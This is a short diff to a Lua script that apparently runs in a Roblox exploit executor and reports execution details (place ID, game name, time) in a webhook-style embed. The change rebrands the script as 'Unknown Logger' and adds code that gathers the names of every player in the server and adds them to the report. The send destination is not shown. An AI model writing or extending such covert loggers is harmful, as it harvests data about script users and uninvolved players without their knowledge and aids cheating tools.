@@ -1,5 +1,9 @@
-getgenv().Version = '2.6.3.';
-getgenv().sym = 'Symmertrical Blue ®';
+local players = ""
+for _,v in next, game.Players:GetPlayers() do
+  players = players .."\n".. v.Name
+end
+getgenv().Version = '2.9.3.';
+getgenv().sym = 'Unknown Logger ®';
 
 local req = http_request or request or (syn and syn.request)
 local HS = game:GetService("HttpService")
@@ -91,6 +95,8 @@ pcall(function()
           {name = "**Game Place ID**", value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"},
           {name = "**Game Name**", value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name},
           {name = "**Execution Time:**", value = ''..os.date("%I:%M:%S %p")},
+          {name = "Players [In Game]", value = ''..players..''},
+          
           {name = "** **", value = '**| Version |  **'..Version..' | '..sym},
        }
     }
